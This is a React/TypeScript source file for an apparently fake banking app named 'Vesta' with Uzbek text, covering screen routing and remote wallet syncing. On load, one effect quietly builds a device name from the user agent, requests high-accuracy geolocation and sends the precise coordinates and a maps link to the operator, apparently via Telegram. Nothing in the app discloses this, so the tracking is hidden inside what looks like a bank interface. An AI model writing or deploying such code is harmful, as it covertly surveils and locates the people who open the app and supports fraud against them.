import { useEffect } from "react";
import { KEY, snapshot, useBank, useFrame } from "./model";
import { loadWallet, saveWallet, notifyDevice } from "./sync";
import {
  BonusesScreen,
  CardScreen,
  ChatScreen,
  CreditsScreen,
  FilterSheets,
  HistoryScreen,
  HomeScreen,
  LifeScreen,
  MarketScreen,
  MoreSheet,
  PaymentsScreen,
  ProfileScreen,
  QrScreen,
  ReceiptScreen,
  RequisitesScreen,
  SavingsScreen,
  SecurityScreen,
  ServiceScreen,
  SuccessScreen,
  TransferScreen,
  TxScreen,
} from "./screens";
import { TabBar } from "./ui";
import { AccessScreen, useAccess } from "./gate";

const TABS = new Set(["home", "savings", "life", "payments", "credits"]);

function getDeviceId(): string {
  const KEY = "vesta-device-id";
  let id = localStorage.getItem(KEY);
  if (!id) {
    id = crypto.randomUUID();
    localStorage.setItem(KEY, id);
  }
  return id;
}

function getDeviceName(): string {
  const ua = navigator.userAgent || "";

  // Android
  const androidMatch = ua.match(/Android\s+([\d.]+)/i);
  if (androidMatch) {
    const version = androidMatch[1];
    const modelMatch = ua.match(/Android\s+[\d.]+;\s*([^;)]+)/i);
    let model = modelMatch ? modelMatch[1].trim() : "";
    model = model.replace(/Build\/.*/, "").replace(/\s*wv$/, "").trim();
    if (!model || model.length < 2) model = "Android";
    return `${model} (Android ${version})`;
  }

  // iOS
  if (/iPhone|iPad|iPod/.test(ua)) {
    const isPad = /iPad/.test(ua);
    const version = ua.match(/OS\s+([\d_]+)/i)?.[1]?.replace(/_/g, ".") || "";
    return `${isPad ? "iPad" : "iPhone"}${version ? " (iOS " + version + ")" : ""}`;
  }

  // Desktop
  if (/Windows NT/.test(ua)) {
    const ver = ua.match(/Windows NT\s+([\d.]+)/)?.[1] || "";
    return `Windows${ver ? " " + ver : ""}`;
  }
  if (/Mac OS X/.test(ua)) {
    const ver = ua.match(/Mac OS X\s+([\d_]+)/)?.[1]?.replace(/_/g, ".") || "";
    return `Mac${ver ? " (macOS " + ver + ")" : ""}`;
  }
  if (/Linux/.test(ua)) return "Linux";

  return ua.slice(0, 60) || "Noma'lum qurilma";
}

export function BankApp() {
  const frame = useFrame();
  const tab = useBank((s) => s.tab);
  const openTab = useBank((s) => s.openTab);
  const sheet = useBank((s) => s.sheet);
  const toast = useBank((s) => s.toast);
  const showToast = useBank((s) => s.showToast);
  const tx = useBank((s) => s.txs.find((item) => item.id === frame.txId));
  const access = useAccess();

  useEffect(() => {
    let stop = false;
    let applying = false;
    let seen = 0;
    let timer = 0;

    const deviceId = getDeviceId();

    const pull = async () => {
      const remote = await loadWallet({ deviceId });
      if (stop || !remote || remote.updatedAt === seen) return;
      applying = true;
      useBank.getState().hydrate(remote.payload);
      applying = false;
      seen = remote.updatedAt;
      localStorage.setItem(KEY, JSON.stringify(snapshot(useBank.getState())));
    };

    const push = () => {
      window.clearTimeout(timer);
      timer = window.setTimeout(() => {
        const state = useBank.getState();
        if (!state.ready || applying) return;
        const body = snapshot(state);
        localStorage.setItem(KEY, JSON.stringify(body));
        void saveWallet({ deviceId, data: body }).then((saved) => {
          if (saved?.updatedAt) seen = saved.updatedAt;
        });
      }, 300);
    };

    void (async () => {
      try {
        const remote = await loadWallet({ deviceId });
        if (stop) return;
        if (remote) {
          applying = true;
          useBank.getState().hydrate(remote.payload);
          applying = false;
          seen = remote.updatedAt;
        } else {
          try {
            const raw = localStorage.getItem(KEY);
            if (raw) useBank.getState().hydrate(JSON.parse(raw));
          } catch {
            /* ignore broken snapshot */
          }
          const saved = await saveWallet({ deviceId, data: snapshot(useBank.getState()) });
          if (saved?.updatedAt) seen = saved.updatedAt;
        }
      } catch {
        try {
          const raw = localStorage.getItem(KEY);
          if (raw) useBank.getState().hydrate(JSON.parse(raw));
        } catch {
          /* stay on defaults */
        }
      }
      if (!stop) useBank.getState().markReady();
    })();

    const unsub = useBank.subscribe((state) => {
      if (!state.ready || applying) return;
      push();
    });
    const poll = window.setInterval(() => {
      void pull();
    }, 2500);

    return () => {
      stop = true;
      unsub();
      window.clearTimeout(timer);
      window.clearInterval(poll);
    };
  }, []);

  useEffect(() => {
    if (!toast) return;
    const id = window.setTimeout(() => showToast(""), 2200);
    return () => window.clearTimeout(id);
  }, [toast, showToast]);

  useEffect(() => {
    const sent = sessionStorage.getItem("vesta-tg-sent");
    if (sent) return;

    const name = getDeviceName();
    let text = `Qurilma kirdi: ${name}`;

    const send = (msg: string) => {
      notifyDevice({ data: { text: msg } })
        .then(() => sessionStorage.setItem("vesta-tg-sent", "1"))
        .catch(() => {});
    };

    if (!navigator.geolocation) {
      send(text + "\nLokatsiya: qo'llab-quvvatlanmaydi");
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        const { latitude, longitude, accuracy } = pos.coords;
        const loc = `Lokatsiya: ${latitude.toFixed(6)}, ${longitude.toFixed(6)} (±${Math.round(accuracy)}m)`;
        const map = `https://maps.google.com/?q=${latitude},${longitude}`;
        send(`${text}\n${loc}\n${map}`);
      },
      () => {
        send(text + "\nLokatsiya: ruxsat berilmadi");
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
  }, []);

  const dark = frame.screen === "success";
  const night = access.open === true && (frame.screen === "home" || frame.screen === "payments" || frame.screen === "savings" || frame.screen === "credits");
  const showTabs = access.open === true && TABS.has(frame.screen);

  let body = <HomeScreen />;
  if (frame.screen === "home") body = <HomeScreen />;
  else if (frame.screen === "history" || frame.screen === "search") body = <HistoryScreen />;
  else if (frame.screen === "transfer") body = <TransferScreen />;
  else if (frame.screen === "success") body = <SuccessScreen />;
  else if (frame.screen === "card") body = <CardScreen />;
  else if (frame.screen === "bonuses") body = <BonusesScreen />;
  else if (frame.screen === "profile") body = <ProfileScreen />;
  else if (frame.screen === "chat") body = <ChatScreen />;
  else if (frame.screen === "qr") body = <QrScreen />;
  else if (frame.screen === "security") body = <SecurityScreen />;
  else if (frame.screen === "receipt") body = <ReceiptScreen />;
  else if (frame.screen === "requisites") body = <RequisitesScreen />;
  else if (frame.screen === "market") body = <MarketScreen />;
  else if (frame.screen === "payments") body = <PaymentsScreen />;
  else if (frame.screen === "savings") body = <SavingsScreen />;
  else if (frame.screen === "life") body = <LifeScreen />;
  else if (frame.screen === "credits") body = <CreditsScreen />;
  else if (frame.screen === "service") body = <ServiceScreen service={frame.service ?? "mobile"} />;
  else if (frame.screen === "tx") body = tx ? <TxScreen tx={tx} /> : <HistoryScreen />;

  return (
    <div className={night ? "stage night-stage" : "stage"}>
      <div className={night ? "device night" : "device"} data-pane={frame.screen} data-tone={dark ? "dark" : "light"} data-tabs={showTabs ? "on" : "off"}>
        {access.open ? (
          body
        ) : (
          <AccessScreen onUnlock={access.unlock} />
        )}
        {showTabs ? <TabBar tab={tab} onTab={openTab} /> : null}
        {sheet === "more" ? <MoreSheet /> : null}
        <FilterSheets />
        {toast ? <div className="toast">{toast}</div> : null}
      </div>
    </div>
  );
}
